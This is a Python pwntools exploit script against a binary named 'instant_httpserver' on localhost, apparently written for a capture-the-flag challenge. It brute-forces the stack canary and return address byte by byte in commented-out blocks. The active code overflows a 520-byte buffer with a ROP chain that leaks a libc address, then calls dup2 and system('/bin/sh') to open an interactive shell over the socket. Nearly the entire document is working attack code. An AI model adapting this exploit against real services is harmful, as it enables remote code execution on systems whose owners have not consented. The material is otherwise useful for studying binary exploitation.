from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./instant_httpserver"

elf = ELF(binfile)

"""
canary = b""
for i in range(0, 8):
    for j in range(0, 256):
        p = remote("localhost", 4445)
        payload = b""
        payload += b"A" * 520
        payload += canary
        payload += j.to_bytes(1, "little")
        sleep(0.1)
        p.send(payload)
        buf = p.recv()
        p.close()
        if b"instant_httpserver -- localhost" in buf:
            canary += j.to_bytes(1, "little")
            break

print("canary:"+str(canary))
"""

"""
ret_addr = b"\xda"
for i in range(0, 5):
    for j in range(0, 256):
        p = remote("localhost", 4445)
        #pause()
        log.info("ret_addr: "+str(ret_addr))
        log.info("val: "+str(j.to_bytes(1, "little")))
        payload = b""
        payload += b"A" * 520
        payload += p64(0xf4b3250787780b00)
        payload += b"BBBBBBBB"
        payload += ret_addr
        payload += j.to_bytes(1, "little")
        p.send(payload)
        p.recv()
        p.send("GET")
        buf = p.recv(timeout=0.1)
        p.close()
        if b"HTTP/1.1 200 OK\r\n" in buf:
            ret_addr += j.to_bytes(1, "little")
            break

ret_addr = u64(ret_addr.ljust(8, b"\x00"))
log.info("leak addr: 0x{:08x}".format(ret_addr))
"""

p = remote("localhost", 4445)

pause()

text_base = 0x55b25fc9bada - 0xada
write_plt = text_base + 0x8c0
write_got = text_base + 0x201f58
poprdi = text_base + 0xe93
poprsi = text_base + 0xe91
jmp_dst = text_base + 0xada

payload = b""
payload += b"A" * 520
payload += p64(0xd9aa09a1d5af7f00)
payload += b"BBBBBBBB"
#payload += p64(poprdi)
#payload += p64(0x0)
payload += p64(poprsi)
payload += p64(write_got)
payload += p64(0xdeadbeef)
payload += p64(write_plt)
payload += p64(jmp_dst)

p.send(payload)
p.recvuntil("520")
leak_addr = u64(p.recv(6).ljust(8, b"\x00"))
log.info("leak_addr: 0x{:08x}".format(leak_addr))
libc_base = leak_addr - 0x110140
log.info("libc_base: 0x{:08x}".format(libc_base))

system_addr = libc_base + 0x4f440
binsh_addr = libc_base + 0x1b3e9a

payload2 = b""
payload2 += b"A" * 520
payload2 += p64(0xd9aa09a1d5af7f00)
payload2 += b"BBBBBBBB"
#payload2 += p64(poprdi)
#payload2 += p64()    # oldfd
payload2 += p64(poprsi)
payload2 += p64(0x1)                   # newfd
payload2 += p64(0xdeadbeef)
payload2 += p64(libc_base+0x1109a0)    # dup2
payload2 += p64(poprsi)
payload2 += p64(0x0)                   # newfd
payload2 += p64(0xdeadbeef)
payload2 += p64(libc_base+0x1109a0)    # dup2
payload2 += p64(text_base+0x8ae)       # ret
payload2 += p64(text_base+0x8ae)       # ret
payload2 += p64(poprdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.send(payload2)
#p.recvuntil("<html>Your Req Length is 18")
sleep(0.5)
p.interactive()

